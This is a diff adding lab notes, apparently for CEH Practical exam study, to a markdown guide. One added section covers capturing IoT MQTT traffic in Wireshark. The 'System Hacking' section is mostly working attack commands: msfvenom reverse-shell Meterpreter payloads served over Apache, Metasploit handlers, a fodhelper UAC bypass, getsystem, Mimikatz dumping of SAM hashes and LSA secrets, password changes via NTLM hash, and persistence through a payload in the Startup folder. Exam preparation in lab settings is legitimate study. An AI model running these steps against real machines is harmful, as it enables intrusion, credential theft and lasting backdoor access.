@@ -527,6 +527,66 @@ https://ceh-practical.cavementech.com/module-18.-iot-and-ot-hacking/2.-capture-a
 </details>  
 
 
+
+<details><summary># Analyze IoT Traffic using Wireshark</summary>
+    
+    ```console
+    [WS19]
+    
+    Run Bevywise_MQTTRoute_Win_64.exe file.
+	The MQTTRoute will execute and the command prompt will appear. You can see the TCP port using 1883.
+	
+	
+	[WS22] - IoT simulator on the client machine. 
+	
+	Run Bevywise_IoTSimulator_Win_64.exe
+	Launch C:\Bevywise\IotSimulator\bin\runsimulator.bat
+	
+    select Microsoft Edge browser and click OK to open the URL http://127.0.0.1:9000/setnetwork?network=HEALTH_CARE.
+	View the default network named HEALTH_CARE and several devices.
+	
+	Create a virtual IoT network and virtual IoT devices. 
+	select the +New Network option.
+	CEH_FINANCE_NETWORK ->Create.
+	Broker IP Address as [WS19IP]
+	To add IoT devices to the created network, click on the Add blank Device button.
+	Device name:Temperature_Sensor, enter Device Id:TS1, Description and click on Save.
+	To connect the Network and the added devices to the server or Broker, click on the Start Network red color circular icon in right corner.
+	
+	When a connection is established between the network and the added devices and the web server or the MQTT Broker, the red button turns into green.
+	
+	[WS19]
+	Since the Broker was left running, you can see a connection request from machine [WS22] for the device TS1.
+	
+	[WS22]
+	Create the Subscribe command for the device Temperature_Sensor.
+	Click on the Plus icon in the top right corner and select the Subscribe to Command option.
+	The Subscribe for command - TS1 popup opens. Select On start under the Subscribe on tab, type High_Tempe under the Topic tab, and select 1 Atleast once below the 
+	Qos option. Click on Save.
+	can see the Topic added under the Subscribe to Commands section.
+    will capture the traffic between the virtual IoT network and the MQTT Broker to monitor the secure communication.
+	
+	 Wireshark
+	 Note: Make sure you have selected interface which has [WS22IP]
+	
+	[WS19]
+	Open Chrome browser, type http://localhost:8080 and press Enter.
+		Note: Do not use Internet Explorer web browser to open the above URL.
+	Signin
+	Devices Menu 
+	send the command to TS1 using the High_Tempe topic.
+	Command Send section, select Topic as High_Tempe, type Alert for High Temperature and click on the Send button.
+	
+	[WS22]
+	Verify the message is received
+	
+	wireshark
+	filter: mqtt
+	MQ Telemetry Transport Protocol, Ping request/Publish Received/Publish Complete
+	Look for Msg Len,Topic Length,Topic, and Message.
+    ```
+</details>
+
 # Web Application hacking
 
 <details>
@@ -808,4 +868,167 @@ echo -n "dsfsdf"| md5sum  -> diff token
 put success and add diff token in burpsuit
 
 ```
+</details>
+
+# System Hacking
+
+<details>
+<summary> Exploit client-side vulnerabilities and establish a VNC(Virtual Network Computing) session</summary>
+
+```cosole
+
+[parrot]
+sudo su
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST PIP LPORT 444 -f exe -o /home/attacker/Desktop/Test.exe
+mkdir /var/www/html/share
+chmod -R 755 /var/www/html/share
+chown -R www-data:www-data /var/www/html/share
+cp /home/attacker/Desktop/Test.exe /var/www/html/share
+service apache2 start
+
+msfconsole
+use exploit/multi/handler
+set payload windows/meterpreter/reverse_tcp
+set LHOST PIP
+set LPORT 444
+exploit 
+
+[windows]
+http://PIP/share
+download Test.exe
+
+[parrot]
+{Note: If the Meterpreter shell is not automatically connected to the session, type sessions -i 1}
+sysinfo
+upload /root/PowerSploit/Privesc/PowerUp.ps1 -->uploads the PowerSploit file to the target system’s present working directory.
+
+Note: PowerUp.ps1 is a program that enables a user to perform quick checks against a Windows machine for any privilege escalation opportunities. It utilizes various service
+abuse checks, .dll hijacking opportunities, registry checks, etc. to enumerate common elevation methods for a target system.
+
+shell
+powershell -ExecutionPolicy Bypass -Command “. .\PowerUp.ps1;Invoke-AllChecks”
+
+Note: Attackers exploit misconfigured services such as unquoted service paths, service object permissions, unattended installs, modifiable registry autoruns and configurations, and other locations to elevate access privileges. After establishing an active session using Metasploit, attackers use tools such as PowerSploit to detect misconfigured services that exist in the target OS.
+
+exploit VNC vulnerability to gain remote access
+run vnc
+
+```
+</details>
+
+<details>
+<summary>Escalate privileges to gather hashdump using Mimikatz</summary>
+
+  ```console
+  
+        [linux]
+		
+	sudo su
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=[IP] lport=444 -f exe > /home/attacker/Desktop/backdoor.exe
+	share with victim machine
+	
+	msfconsole
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set LHOST [IP]
+	set LPORT 444
+	run
+	
+	[windows]
+	access run backdoor.exe
+	
+	[parrot]
+	sysinfo
+	getuid -> Windows11\Admin
+
+	background
+	use exploit/windows/local/bypassuac_fodhelper
+	set session 1
+	set LHOST [IP]
+	set TARGET 0
+	exploit
+	getsystem -t 1
+	getuid   --> NT AUTHORITY\SYSTEM
+	load kiwi    -->to load mimikatz.
+	help kiwi    -->to view all the kiwi commands.
+	lsa_dump_sam   ->to load NTLM Hash of all users.
+	lsa_dump_secrets -> Note: LSA secrets are used to manage a system's local security policy, and contain sesnsitive data such as User passwords, IE passwords, service 
+	account passwords, SQL 
+	passwords etc.
+	
+	password_change -u Admin -n [NTLM hash of Admin acquired in previous step] -P password
+	lsa_dump_sam   --> check the new hash value
+	
+	[Windows]
+	try to login -> u wont be able to but try with modified pwd, u should be able to login to machine
+
+  ```
+</details>
+
+<details>
+	<summary>Maintain persistence by abusing boot/logon autostart execution</summary>
+
+	```console
+	[linux]
+	sudo su
+	cd 
+	msfvenom -p windows/meterpreter/reverse_tcp -f exe LHOST=IP LPORT=444 > /home/attacker/Desktop/exploit.exe
+	cp /home/attacker/Desktop/exploit.ext /var/www/html/share/   [follow same steps to share folder - mentioned b4]
+	service apache2 start
+	msfconsole
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost IP
+	set lport 444
+	run
+	
+	[windows]
+	http://PIP/share
+	
+	[linux]
+	meterpreter session will be opened
+	getuid
+
+	try to bypass the user account control setting that is blocking you from gaining unrestricted access to the machine.
+	
+	background
+	use exploit/windows/local/bypassuac_fodhelper
+	set session 1
+	show options
+	set LHOST IP
+	set TARGET 0  [0 - Exploit Target ID]
+	exploit
+
+	The BypassUAC exploit has successfully bypassed the UAC setting on the **Windows 11** machine.
+	
+	getsystem -t 1  -> to elevate privileges
+	getuid 
+	cd “C:\\ProgramData\\Start Menu\\Programs\\Startup”
+	pwd
+	create payload that needs to be uploaded into the Startup folder of Windows 11 machine.
+	
+	Second terminal->
+	msfvenom -p windows/meterpreter/reverse_tcp lhost=IP lport=8080 -f exe > payload.exe
+	
+	First Terminal
+	upload /home/attacker/payload.exe 
+	
+	[windows]
+	Login to Admin account -> Restart windows machine
+	
+	[Linux]
+	Open another terminal window with root privilages 
+	msfconsole
+	use exploit/multi/handler
+	set payload windows/meterpreter/reverse_tcp
+	set lhost [IP]
+	set lport 8080
+	exploit
+	
+	[windows]  login to Admin account and restart the machine so that the malicious file that is placed in the startup folder is executed.
+	
+	[parrot]
+	meterpreter session is open [Note: takes little time to open]
+	getuid
+
 </details>
